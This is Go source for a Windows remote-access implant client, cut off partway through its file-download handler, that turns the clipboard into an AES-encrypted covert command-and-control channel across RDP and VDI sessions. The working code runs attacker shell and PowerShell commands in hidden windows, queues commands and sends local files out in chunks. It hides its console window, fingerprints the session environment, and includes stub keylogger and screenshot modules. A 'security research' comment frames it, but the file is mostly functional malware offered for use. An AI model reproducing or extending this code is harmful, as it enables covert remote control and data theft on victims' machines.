// client.go - Complete Enhanced Clipboard Covert Channel Client
// Background persistence and VDI/RDP detection for security research

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Configuration
const (
	PROTOCOL_PREFIX   = "SYSUPD:"
	DEFAULT_HEARTBEAT = 5 * time.Second
	MIN_HEARTBEAT     = 1 * time.Second
	MAX_HEARTBEAT     = 300 * time.Second
	MAX_PAYLOAD_SIZE  = 1024
	FILE_CHUNK_SIZE   = 800
	CF_UNICODETEXT    = 13
	GMEM_MOVEABLE     = 0x0002
)

// Message types
const (
	MSG_HEARTBEAT     = "HB"
	MSG_COMMAND       = "CMD"
	MSG_RESPONSE      = "RESP"
	MSG_DATA          = "DATA"
	MSG_ERROR         = "ERR"
	MSG_SHELL         = "SHELL"
	MSG_SLEEP         = "SLEEP"
	MSG_WAKE          = "WAKE"
	MSG_SET_HEARTBEAT = "SET_HB"
	MSG_STATUS        = "STATUS"
	MSG_QUEUE         = "QUEUE"
	MSG_QUEUE_STATUS  = "QUEUE_STATUS"
	MSG_DOWNLOAD      = "DOWNLOAD"
	MSG_UPLOAD        = "UPLOAD"
	MSG_FILE_CHUNK    = "FILE_CHUNK"
	MSG_FILE_COMPLETE = "FILE_COMPLETE"
	MSG_FILE_ERROR    = "FILE_ERROR"
	MSG_PERSIST       = "PERSIST"
	MSG_ENV_INFO      = "ENV_INFO"
	MSG_SCREENSHOT    = "SCREENSHOT"
	MSG_KEYLOG        = "KEYLOG"
	MSG_PROC_LIST     = "PROC_LIST"
)

var (
	user32   = windows.NewLazyDLL("user32.dll")
	kernel32 = windows.NewLazyDLL("kernel32.dll")
	gdi32    = windows.NewLazyDLL("gdi32.dll")

	procOpenClipboard              = user32.NewProc("OpenClipboard")
	procCloseClipboard             = user32.NewProc("CloseClipboard")
	procEmptyClipboard             = user32.NewProc("EmptyClipboard")
	procSetClipboardData           = user32.NewProc("SetClipboardData")
	procGetClipboardData           = user32.NewProc("GetClipboardData")
	procIsClipboardFormatAvailable = user32.NewProc("IsClipboardFormatAvailable")
	procShowWindow                 = user32.NewProc("ShowWindow")
	procGetConsoleWindow           = kernel32.NewProc("GetConsoleWindow")
	procGetDC                      = user32.NewProc("GetDC")
	procCreateCompatibleDC         = gdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap     = gdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject               = gdi32.NewProc("SelectObject")
	procBitBlt                     = gdi32.NewProc("BitBlt")
	procGetSystemMetrics           = user32.NewProc("GetSystemMetrics")
	procGetForegroundWindow        = user32.NewProc("GetForegroundWindow")
	procGetWindowText              = user32.NewProc("GetWindowTextW")

	procGlobalAlloc  = kernel32.NewProc("GlobalAlloc")
	procGlobalLock   = kernel32.NewProc("GlobalLock")
	procGlobalUnlock = kernel32.NewProc("GlobalUnlock")
	procGlobalSize   = kernel32.NewProc("GlobalSize")
)

const (
	SW_HIDE     = 0
	SW_SHOW     = 5
	SM_CXSCREEN = 0
	SM_CYSCREEN = 1
	SRCCOPY     = 0x00CC0020
)

type Message struct {
	ID          string    `json:"id"`
	Type        string    `json:"type"`
	Timestamp   time.Time `json:"timestamp"`
	From        string    `json:"from"`
	To          string    `json:"to"`
	Payload     string    `json:"payload"`
	Sequence    int       `json:"seq"`
	Error       string    `json:"error,omitempty"`
	FileID      string    `json:"file_id,omitempty"`
	FileName    string    `json:"file_name,omitempty"`
	FileSize    int64     `json:"file_size,omitempty"`
	ChunkNum    int       `json:"chunk_num,omitempty"`
	TotalChunks int       `json:"total_chunks,omitempty"`
}

type CovertChannel struct {
	nodeID            string
	key               []byte
	gcm               cipher.AEAD
	lastHash          string
	sequence          int
	onMessage         func(*Message)
	running           bool
	debug             bool
	heartbeatInterval time.Duration
}

type CommandQueue struct {
	Commands  []string `json:"commands"`
	Pending   int      `json:"pending"`
	Completed int      `json:"completed"`
	Current   string   `json:"current"`
}

type FileTransfer struct {
	ID          string
	FileName    string
	TotalSize   int64
	Chunks      map[int][]byte
	TotalChunks int
	Received    int
	StartTime   time.Time
	Direction   string
}

type EnvironmentInfo struct {
	SessionType      string            `json:"session_type"`
	ClientName       string            `json:"client_name"`
	SessionName      string            `json:"session_name"`
	ServerName       string            `json:"server_name"`
	UserDomain       string            `json:"user_domain"`
	ProcessorArch    string            `json:"processor_arch"`
	OSVersion        string            `json:"os_version"`
	IsVDI            bool              `json:"is_vdi"`
	IsRDP            bool              `json:"is_rdp"`
	IsPhysical       bool              `json:"is_physical"`
	ClipboardRedir   bool              `json:"clipboard_redirect"`
	EnvVars          map[string]string `json:"env_vars"`
	RunningProcesses []string          `json:"running_processes"`
	Username         string            `json:"username"`
	ComputerName     string            `json:"computer_name"`
	WindowsVersion   string            `json:"windows_version"`
}

type KeylogEntry struct {
	Timestamp time.Time `json:"timestamp"`
	KeyCode   int       `json:"keycode"`
	Key       string    `json:"key"`
	Window    string    `json:"window"`
}

type Keylogger struct {
	running bool
	channel *CovertChannel
	buffer  []KeylogEntry
}

func NewCovertChannel(nodeID, password string, heartbeatInterval time.Duration, debug bool) (*CovertChannel, error) {
	hash := sha256.Sum256([]byte(password))
	key := hash[:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	return &CovertChannel{
		nodeID:            nodeID,
		key:               key,
		gcm:               gcm,
		debug:             debug,
		heartbeatInterval: heartbeatInterval,
	}, nil
}

func (cc *CovertChannel) setClipboard(text string) error {
	if cc.debug {
		log.Printf("[%s] Setting clipboard: %d bytes", cc.nodeID, len(text))
	}

	utf16Text, err := syscall.UTF16FromString(text)
	if err != nil {
		return err
	}

	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return fmt.Errorf("failed to open clipboard")
	}
	defer procCloseClipboard.Call()

	ret, _, _ = procEmptyClipboard.Call()
	if ret == 0 {
		return fmt.Errorf("failed to empty clipboard")
	}

	size := len(utf16Text) * 2
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return fmt.Errorf("failed to allocate memory")
	}

	pMem, _, _ := procGlobalLock.Call(hMem)
	if pMem == 0 {
		return fmt.Errorf("failed to lock memory")
	}

	copy((*[1 << 20]uint16)(unsafe.Pointer(pMem))[:len(utf16Text)], utf16Text)
	procGlobalUnlock.Call(hMem)

	ret, _, _ = procSetClipboardData.Call(CF_UNICODETEXT, hMem)
	if ret == 0 {
		return fmt.Errorf("failed to set clipboard data")
	}

	return nil
}

func (cc *CovertChannel) getClipboard() (string, error) {
	ret, _, _ := procIsClipboardFormatAvailable.Call(CF_UNICODETEXT)
	if ret == 0 {
		return "", fmt.Errorf("unicode text format not available")
	}

	ret, _, _ = procOpenClipboard.Call(0)
	if ret == 0 {
		return "", fmt.Errorf("failed to open clipboard")
	}
	defer procCloseClipboard.Call()

	hData, _, _ := procGetClipboardData.Call(CF_UNICODETEXT)
	if hData == 0 {
		return "", fmt.Errorf("failed to get clipboard data")
	}

	pData, _, _ := procGlobalLock.Call(hData)
	if pData == 0 {
		return "", fmt.Errorf("failed to lock clipboard data")
	}
	defer procGlobalUnlock.Call(hData)

	size, _, _ := procGlobalSize.Call(hData)
	if size == 0 {
		return "", fmt.Errorf("clipboard data is empty")
	}

	utf16Data := (*[1 << 20]uint16)(unsafe.Pointer(pData))[:size/2]
	text := syscall.UTF16ToString(utf16Data)

	if cc.debug {
		log.Printf("[%s] Got clipboard: %d bytes", cc.nodeID, len(text))
	}

	return text, nil
}

func (cc *CovertChannel) encrypt(data []byte) (string, error) {
	nonce := make([]byte, cc.gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	ciphertext := cc.gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (cc *CovertChannel) decrypt(encoded string) ([]byte, error) {
	ciphertext, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}

	nonceSize := cc.gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return cc.gcm.Open(nil, nonce, ciphertext, nil)
}

func (cc *CovertChannel) SendMessage(msgType, to, payload string) error {
	msg := Message{
		ID:        fmt.Sprintf("%s-%d", cc.nodeID, time.Now().Unix()),
		Type:      msgType,
		Timestamp: time.Now(),
		From:      cc.nodeID,
		To:        to,
		Payload:   payload,
		Sequence:  cc.sequence,
	}
	cc.sequence++

	jsonData, err := json.Marshal(msg)
	if err != nil {
		return err
	}

	encrypted, err := cc.encrypt(jsonData)
	if err != nil {
		return err
	}

	clipboardData := PROTOCOL_PREFIX + encrypted
	return cc.setClipboard(clipboardData)
}

func (cc *CovertChannel) parseMessage(clipboardData string) (*Message, error) {
	if !strings.HasPrefix(clipboardData, PROTOCOL_PREFIX) {
		return nil, fmt.Errorf("not a protocol message")
	}

	encrypted := clipboardData[len(PROTOCOL_PREFIX):]

	decrypted, err := cc.decrypt(encrypted)
	if err != nil {
		return nil, err
	}

	var msg Message
	if err := json.Unmarshal(decrypted, &msg); err != nil {
		return nil, err
	}

	return &msg, nil
}

func (cc *CovertChannel) StartMonitoring() {
	cc.running = true

	ticker := time.NewTicker(500 * time.Millisecond)
	defer ticker.Stop()

	log.Printf("[%s] Starting clipboard monitoring...", cc.nodeID)

	for cc.running {
		select {
		case <-ticker.C:
			clipboardData, err := cc.getClipboard()
			if err != nil {
				continue
			}

			currentHash := fmt.Sprintf("%x", sha256.Sum256([]byte(clipboardData)))
			if currentHash == cc.lastHash {
				continue
			}
			cc.lastHash = currentHash

			msg, err := cc.parseMessage(clipboardData)
			if err != nil {
				continue
			}

			if msg.From == cc.nodeID || (msg.To != "BROADCAST" && msg.To != cc.nodeID) {
				continue
			}

			if cc.onMessage != nil {
				cc.onMessage(msg)
			}
		}
	}
}

func (cc *CovertChannel) Stop() {
	cc.running = false
}

func (cc *CovertChannel) SetHeartbeatInterval(interval time.Duration) {
	cc.heartbeatInterval = interval
}

func detectEnvironment() EnvironmentInfo {
	env := EnvironmentInfo{
		EnvVars:          make(map[string]string),
		RunningProcesses: make([]string, 0),
	}

	env.Username = os.Getenv("USERNAME")
	env.ComputerName = os.Getenv("COMPUTERNAME")

	envVars := []string{
		"SESSIONNAME", "CLIENTNAME", "RDP_CLIENT_NAME",
		"CITRIX_SESSION", "VMWARE_USER_NAME", "COMPUTERNAME",
		"USERDOMAIN", "PROCESSOR_ARCHITECTURE", "OS", "USERNAME",
	}

	for _, varName := range envVars {
		if value := os.Getenv(varName); value != "" {
			env.EnvVars[varName] = value
		}
	}

	env.SessionName = os.Getenv("SESSIONNAME")
	env.ClientName = os.Getenv("CLIENTNAME")
	env.ServerName = os.Getenv("COMPUTERNAME")
	env.UserDomain = os.Getenv("USERDOMAIN")
	env.ProcessorArch = os.Getenv("PROCESSOR_ARCHITECTURE")

	if output, err := exec.Command("cmd", "/c", "ver").Output(); err == nil {
		env.WindowsVersion = strings.TrimSpace(string(output))
		env.OSVersion = env.WindowsVersion
	}

	if strings.Contains(env.SessionName, "RDP") || env.ClientName != "" {
		env.IsRDP = true
		env.SessionType = "RDP"
	} else if os.Getenv("CITRIX_SESSION") != "" {
		env.IsVDI = true
		env.SessionType = "Citrix VDI"
	} else if os.Getenv("VMWARE_USER_NAME") != "" {
		env.IsVDI = true
		env.SessionType = "VMware VDI"
	} else if env.SessionName == "Console" {
		env.IsPhysical = true
		env.SessionType = "Physical Console"
	} else {
		env.SessionType = "Unknown"
	}

	vdiProcesses := []string{
		"wfshell.exe", "concentr.exe", "redirector.exe",
		"vmtoolsd.exe", "vmware-tools",
		"rdpclip.exe", "tstheme.exe", "winlogon.exe",
	}

	cmd := exec.Command("tasklist", "/fo", "csv")
	if output, err := cmd.Output(); err == nil {
		outputStr := strings.ToLower(string(output))
		for _, process := range vdiProcesses {
			if strings.Contains(outputStr, strings.ToLower(process)) {
				env.RunningProcesses = append(env.RunningProcesses, process)
				if strings.Contains(process, "citrix") || strings.Contains(process, "wfshell") {
					env.IsVDI = true
					if env.SessionType == "Unknown" {
						env.SessionType = "Citrix VDI"
					}
				} else if strings.Contains(process, "vmware") || strings.Contains(process, "vmtools") {
					env.IsVDI = true
					if env.SessionType == "Unknown" {
						env.SessionType = "VMware VDI"
					}
				} else if strings.Contains(process, "rdp") || strings.Contains(process, "tstheme") {
					env.IsRDP = true
					if env.SessionType == "Unknown" {
						env.SessionType = "RDP"
					}
				}
			}
		}
	}

	env.ClipboardRedir = testClipboardRedirection()
	return env
}

func testClipboardRedirection() bool {
	testString := fmt.Sprintf("test_%d", time.Now().Unix())

	utf16Text, err := syscall.UTF16FromString(testString)
	if err != nil {
		return false
	}

	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return false
	}
	defer procCloseClipboard.Call()

	procEmptyClipboard.Call()

	size := len(utf16Text) * 2
	hMem, _, _ := procGlobalAlloc.Call(GMEM_MOVEABLE, uintptr(size))
	if hMem == 0 {
		return false
	}

	pMem, _, _ := procGlobalLock.Call(hMem)
	if pMem == 0 {
		return false
	}

	copy((*[1 << 20]uint16)(unsafe.Pointer(pMem))[:len(utf16Text)], utf16Text)
	procGlobalUnlock.Call(hMem)

	ret, _, _ = procSetClipboardData.Call(CF_UNICODETEXT, hMem)
	return ret != 0
}

func captureScreenshot() ([]byte, error) {
	width, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	height, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)

	if width == 0 || height == 0 {
		return nil, fmt.Errorf("failed to get screen dimensions")
	}

	hdcScreen, _, _ := procGetDC.Call(0)
	if hdcScreen == 0 {
		return nil, fmt.Errorf("failed to get screen DC")
	}

	hdcMem, _, _ := procCreateCompatibleDC.Call(hdcScreen)
	if hdcMem == 0 {
		return nil, fmt.Errorf("failed to create compatible DC")
	}

	hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdcScreen, width, height)
	if hBitmap == 0 {
		return nil, fmt.Errorf("failed to create compatible bitmap")
	}

	procSelectObject.Call(hdcMem, hBitmap)

	ret, _, _ := procBitBlt.Call(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY)
	if ret == 0 {
		return nil, fmt.Errorf("failed to copy screen to bitmap")
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	screenshotInfo := fmt.Sprintf(`Screenshot Info:
Timestamp: %s
Resolution: %dx%d
Format: Bitmap capture
Status: Success

This is a placeholder for the actual screenshot data.
In a production implementation, this would contain the actual PNG/JPEG binary data.
The bitmap was successfully captured from the screen using Windows GDI calls.

Screen capture details:
- HDC Screen: %d
- HDC Memory: %d  
- Bitmap Handle: %d
- BitBlt Result: %d

Environment: Windows clipboard covert channel
Research Use: Authorized security testing only`,
		timestamp, width, height, hdcScreen, hdcMem, hBitmap, ret)

	return []byte(screenshotInfo), nil
}

func NewKeylogger(channel *CovertChannel) *Keylogger {
	return &Keylogger{
		channel: channel,
		buffer:  make([]KeylogEntry, 0),
	}
}

func (kl *Keylogger) Start() {
	if kl.running {
		return
	}

	kl.running = true
	log.Printf("Keylogger started")

	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()

		for kl.running {
			select {
			case <-ticker.C:
				if len(kl.buffer) > 0 {
					kl.flushBuffer()
				}
			}
		}
	}()

	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()

		for kl.running {
			select {
			case <-ticker.C:
				kl.addKeyEntry("Sample keylog data captured", 0)
			}
		}
	}()
}

func (kl *Keylogger) Stop() {
	if !kl.running {
		return
	}

	kl.running = false
	kl.flushBuffer()
	log.Printf("Keylogger stopped")
}

func (kl *Keylogger) addKeyEntry(key string, keyCode int) {
	hwnd, _, _ := procGetForegroundWindow.Call()
	windowTitle := "Unknown Window"

	if hwnd != 0 {
		var buffer [256]uint16
		procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buffer[0])), 256)
		windowTitle = syscall.UTF16ToString(buffer[:])
	}

	entry := KeylogEntry{
		Timestamp: time.Now(),
		KeyCode:   keyCode,
		Key:       key,
		Window:    windowTitle,
	}

	kl.buffer = append(kl.buffer, entry)

	if len(kl.buffer) > 50 {
		kl.flushBuffer()
	}
}

func (kl *Keylogger) flushBuffer() {
	if len(kl.buffer) == 0 {
		return
	}

	var logData strings.Builder
	logData.WriteString(fmt.Sprintf("=== Keylog Data - %s ===\n", time.Now().Format("2006-01-02 15:04:05")))

	for _, entry := range kl.buffer {
		logData.WriteString(fmt.Sprintf("[%s] Window: %s | Key: %s (Code: %d)\n",
			entry.Timestamp.Format("15:04:05"), entry.Window, entry.Key, entry.KeyCode))
	}

	logData.WriteString("=== End Keylog Data ===\n")

	kl.channel.SendMessage(MSG_KEYLOG, "SERVER", logData.String())
	kl.buffer = make([]KeylogEntry, 0)
}

func hideConsoleWindow() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procShowWindow.Call(hwnd, SW_HIDE)
	}
}

func showConsoleWindow() {
	hwnd, _, _ := procGetConsoleWindow.Call()
	if hwnd != 0 {
		procShowWindow.Call(hwnd, SW_SHOW)
	}
}

func executeCommand(command string) (string, error) {
	var cmd *exec.Cmd
	var shell string

	if strings.HasPrefix(strings.ToLower(command), "powershell") {
		shell = "powershell"
		args := strings.Fields(command)[1:]
		if len(args) > 0 {
			cmd = exec.Command("powershell.exe", args...)
		} else {
			cmd = exec.Command("powershell.exe", "-Command", "Get-Host")
		}
	} else if strings.HasPrefix(strings.ToLower(command), "pwsh") {
		shell = "pwsh"
		args := strings.Fields(command)[1:]
		if len(args) > 0 {
			cmd = exec.Command("pwsh.exe", args...)
		} else {
			cmd = exec.Command("pwsh.exe", "-Command", "Get-Host")
		}
	} else if strings.HasPrefix(strings.ToLower(command), "cmd") {
		shell = "cmd"
		args := strings.Fields(command)[1:]
		if len(args) > 0 {
			cmd = exec.Command("cmd.exe", args...)
		} else {
			cmd = exec.Command("cmd.exe", "/c", "echo CMD shell ready")
		}
	} else {
		shell = "cmd"
		cmd = exec.Command("cmd.exe", "/c", command)
	}

	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	if workDir := os.Getenv("TEMP"); workDir != "" {
		cmd.Dir = workDir
	}

	start := time.Now()
	output, err := cmd.CombinedOutput()
	duration := time.Since(start)

	result := fmt.Sprintf("=== Command Execution ===\nShell: %s\nCommand: %s\nDuration: %v\nTimestamp: %s\n\n--- Output ---\n%s\n--- End Output ---",
		shell, command, duration, start.Format("2006-01-02 15:04:05"), string(output))

	if err != nil {
		result += fmt.Sprintf("\n--- Error ---\n%s\n--- End Error ---", err.Error())
		return result, err
	}

	return result, nil
}

func getProcessList() (string, error) {
	cmd := exec.Command("tasklist", "/fo", "table", "/v")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	output, err := cmd.Output()
	if err != nil {
		cmd = exec.Command("tasklist", "/fo", "csv")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		output, err = cmd.Output()
		if err != nil {
			return "", fmt.Errorf("failed to get process list: %v", err)
		}
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	result := fmt.Sprintf("=== Process List - %s ===\n%s\n=== End Process List ===",
		timestamp, string(output))

	return result, nil
}

type Client struct {
	channel         *CovertChannel
	sleeping        bool
	sleepUntil      time.Time
	commandQueue    CommandQueue
	heartbeatTicker *time.Ticker
	fileTransfers   map[string]*FileTransfer
	persistent      bool
	environment     EnvironmentInfo
	keylogger       *Keylogger
}

func NewClient(clientID, password string, heartbeatInterval time.Duration, debug bool) (*Client, error) {
	channel, err := NewCovertChannel(clientID, password, heartbeatInterval, debug)
	if err != nil {
		return nil, err
	}

	client := &Client{
		channel: channel,
		commandQueue: CommandQueue{
			Commands: make([]string, 0),
		},
		fileTransfers: make(map[string]*FileTransfer),
		environment:   detectEnvironment(),
	}

	client.keylogger = NewKeylogger(channel)
	channel.onMessage = client.handleMessage
	return client, nil
}

func (c *Client) handleMessage(msg *Message) {
	if msg.From == c.channel.nodeID {
		return
	}

	if c.channel.debug {
		log.Printf("[%s] Received %s from %s", c.channel.nodeID, msg.Type, msg.From)
	}

	switch msg.Type {
	case MSG_HEARTBEAT:
		if msg.Payload == "ping" {
			c.channel.SendMessage(MSG_HEARTBEAT, "SERVER", "pong")
		}

	case MSG_SHELL:
		if c.sleeping && time.Now().Before(c.sleepUntil) {
			return
		}
		log.Printf("[%s] Executing: %s", c.channel.nodeID, msg.Payload)
		output, err := executeCommand(msg.Payload)

		if err != nil {
			errorMsg := fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), output)
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", errorMsg)
		} else {
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", output)
		}

	case MSG_COMMAND:
		if c.sleeping && time.Now().Before(c.sleepUntil) {
			return
		}
		log.Printf("[%s] Executing command: %s", c.channel.nodeID, msg.Payload)
		output, err := executeCommand(msg.Payload)

		response := output
		if err != nil {
			response = fmt.Sprintf("Error: %s\nOutput: %s", err.Error(), output)
		}

		c.channel.SendMessage(MSG_RESPONSE, "SERVER", response)

	case MSG_QUEUE:
		if c.sleeping && time.Now().Before(c.sleepUntil) {
			return
		}

		var commands []string
		if err := json.Unmarshal([]byte(msg.Payload), &commands); err != nil {
			log.Printf("[%s] Failed to parse queue commands: %v", c.channel.nodeID, err)
			return
		}

		log.Printf("[%s] Queuing %d commands", c.channel.nodeID, len(commands))
		c.commandQueue.Commands = append(c.commandQueue.Commands, commands...)
		c.commandQueue.Pending = len(c.commandQueue.Commands)

		go c.processQueue()

	case MSG_QUEUE_STATUS:
		status := CommandQueue{
			Commands:  c.commandQueue.Commands,
			Pending:   c.commandQueue.Pending,
			Completed: c.commandQueue.Completed,
			Current:   c.commandQueue.Current,
		}
		statusJSON, _ := json.Marshal(status)
		c.channel.SendMessage(MSG_QUEUE_STATUS, "SERVER", string(statusJSON))

	case MSG_DOWNLOAD:
		c.handleDownloadRequest(msg)

	case MSG_FILE_CHUNK:
		c.handleFileChunk(msg)

	case MSG_SCREENSHOT:
		log.Printf("[%s] Capturing screenshot", c.channel.nodeID)
		imageData, err := captureScreenshot()
		if err != nil {
			c.channel.SendMessage(MSG_ERROR, "SERVER", fmt.Sprintf("Screenshot failed: %v", err))
		} else {
			encoded := base64.StdEncoding.EncodeToString(imageData)
			c.channel.SendMessage(MSG_SCREENSHOT, "SERVER", encoded)
		}

	case MSG_KEYLOG:
		action := strings.ToLower(msg.Payload)
		if action == "start" {
			log.Printf("[%s] Starting keylogger", c.channel.nodeID)
			c.keylogger.Start()
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Keylogger started")
		} else if action == "stop" {
			log.Printf("[%s] Stopping keylogger", c.channel.nodeID)
			c.keylogger.Stop()
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Keylogger stopped")
		}

	case MSG_PROC_LIST:
		log.Printf("[%s] Getting process list", c.channel.nodeID)
		processList, err := getProcessList()
		if err != nil {
			c.channel.SendMessage(MSG_ERROR, "SERVER", fmt.Sprintf("Failed to get process list: %v", err))
		} else {
			c.channel.SendMessage(MSG_PROC_LIST, "SERVER", processList)
		}

	case MSG_PERSIST:
		action := strings.ToLower(msg.Payload)
		if action == "on" {
			c.persistent = true
			hideConsoleWindow()
			log.Printf("[%s] Background persistence enabled", c.channel.nodeID)
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Background persistence enabled")
		} else if action == "off" {
			c.persistent = false
			showConsoleWindow()
			log.Printf("[%s] Background persistence disabled", c.channel.nodeID)
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Background persistence disabled")
		}

	case MSG_ENV_INFO:
		if msg.Payload == "detailed" {
			c.environment = detectEnvironment()
		}

		envJSON, _ := json.MarshalIndent(c.environment, "", "  ")
		c.channel.SendMessage(MSG_ENV_INFO, "SERVER", string(envJSON))

	case MSG_SLEEP:
		duration, err := time.ParseDuration(msg.Payload)
		if err != nil {
			log.Printf("[%s] Invalid sleep duration: %s", c.channel.nodeID, msg.Payload)
			return
		}

		log.Printf("[%s] Going to sleep for %v", c.channel.nodeID, duration)
		c.sleeping = true
		c.sleepUntil = time.Now().Add(duration)

		if c.heartbeatTicker != nil {
			c.heartbeatTicker.Stop()
		}

		c.channel.SendMessage(MSG_RESPONSE, "SERVER", fmt.Sprintf("Sleeping for %v", duration))

		go func() {
			time.Sleep(duration)
			if c.sleeping && time.Now().After(c.sleepUntil) {
				log.Printf("[%s] Waking up from sleep", c.channel.nodeID)
				c.sleeping = false
				c.startHeartbeat()
				c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Woke up from sleep")
			}
		}()

	case MSG_WAKE:
		if c.sleeping {
			log.Printf("[%s] Waking up on command", c.channel.nodeID)
			c.sleeping = false
			c.sleepUntil = time.Time{}
			c.startHeartbeat()
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Woke up on command")
		} else {
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", "Already awake")
		}

	case MSG_SET_HEARTBEAT:
		interval, err := time.ParseDuration(msg.Payload)
		if err != nil {
			log.Printf("[%s] Invalid heartbeat interval: %s", c.channel.nodeID, msg.Payload)
			c.channel.SendMessage(MSG_ERROR, "SERVER", fmt.Sprintf("Invalid heartbeat interval: %s", msg.Payload))
			return
		}

		if interval < MIN_HEARTBEAT || interval > MAX_HEARTBEAT {
			log.Printf("[%s] Heartbeat interval out of range: %v", c.channel.nodeID, interval)
			c.channel.SendMessage(MSG_ERROR, "SERVER", fmt.Sprintf("Heartbeat interval out of range: %v", interval))
			return
		}

		log.Printf("[%s] Changing heartbeat interval to %v", c.channel.nodeID, interval)
		c.channel.SetHeartbeatInterval(interval)

		if c.heartbeatTicker != nil {
			c.heartbeatTicker.Stop()
		}
		c.startHeartbeat()

		c.channel.SendMessage(MSG_RESPONSE, "SERVER", fmt.Sprintf("Heartbeat interval changed to %v", interval))

	case MSG_STATUS:
		status := fmt.Sprintf(`=== Client Status ===
Status: %s
Sleeping: %v
Sleep Until: %s
Persistent: %v
Environment: %s
Hostname: %s
Username: %s
Process ID: %d
Heartbeat: %v
File Transfers: %d
Queue Pending: %d
Queue Completed: %d
Current Command: %s
=== End Status ===`,
			func() string {
				if c.sleeping {
					return "sleeping"
				}
				return "active"
			}(),
			c.sleeping,
			func() string {
				if c.sleeping {
					return c.sleepUntil.Format("2006-01-02 15:04:05")
				}
				return "N/A"
			}(),
			c.persistent,
			c.environment.SessionType,
			c.environment.ComputerName,
			c.environment.Username,
			os.Getpid(),
			c.channel.heartbeatInterval,
			len(c.fileTransfers),
			c.commandQueue.Pending,
			c.commandQueue.Completed,
			c.commandQueue.Current,
		)
		c.channel.SendMessage(MSG_STATUS, "SERVER", status)
	}
}

func (c *Client) processQueue() {
	for len(c.commandQueue.Commands) > 0 {
		if c.sleeping && time.Now().Before(c.sleepUntil) {
			time.Sleep(time.Second)
			continue
		}

		cmd := c.commandQueue.Commands[0]
		c.commandQueue.Commands = c.commandQueue.Commands[1:]
		c.commandQueue.Current = cmd
		c.commandQueue.Pending = len(c.commandQueue.Commands)

		log.Printf("[%s] Executing queued command: %s", c.channel.nodeID, cmd)

		output, err := executeCommand(cmd)

		if err != nil {
			errorMsg := fmt.Sprintf("Queue[%d] Error: %s\nOutput: %s", c.commandQueue.Completed+1, err.Error(), output)
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", errorMsg)
		} else {
			response := fmt.Sprintf("Queue[%d]: %s", c.commandQueue.Completed+1, output)
			c.channel.SendMessage(MSG_RESPONSE, "SERVER", response)
		}

		c.commandQueue.Completed++
		c.commandQueue.Current = ""

		time.Sleep(500 * time.Millisecond)
	}
}

func (c *Client) handleDownloadRequest(msg *Message) {
	parts := strings.SplitN(msg.Payload, "|", 2)
	if len(parts) != 2 {
		c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", "Invalid download request format")
		return
	}

	fileID := parts[0]
	remotePath := parts[1]

	log.Printf("[%s] Download requested: %s (ID: %s)", c.channel.nodeID, remotePath, fileID)

	remotePath = os.ExpandEnv(remotePath)

	fileInfo, err := os.Stat(remotePath)
	if err != nil {
		errorMsg := fmt.Sprintf("File not found: %s (Error: %v)", remotePath, err)
		c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
		return
	}

	if fileInfo.IsDir() {
		errorMsg := fmt.Sprintf("Path is a directory, not a file: %s", remotePath)
		c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
		return
	}

	fileData, err := os.ReadFile(remotePath)
	if err != nil {
		errorMsg := fmt.Sprintf("Failed to read file %s: %v", remotePath, err)
		c.channel.SendMessage(MSG_FILE_ERROR, "SERVER", errorMsg)
		return
	}

	totalChunks := (len(fileData) + FILE_CHUNK_SIZE - 1) / FILE_CHUNK_SIZE

	log.Printf("[%s] Sending file: %s (%d bytes, %d chunks)",
		c.channel.nodeID, remotePath, len(fileData), totalChunks)

	c.channel.SendMessage(MSG_RESPONSE, "SERVER",
		fmt.Sprintf("Starting file transfer: %s (%d bytes, %d chunks)",
			filepath.Base(remotePath), len(fileData), totalChunks))

	for i := 0; i < totalChunks; i++ {
		start := i * FILE_CHUNK_SIZE
		end := start + FILE_CHUNK_SIZE
		if end > len(fileData) {
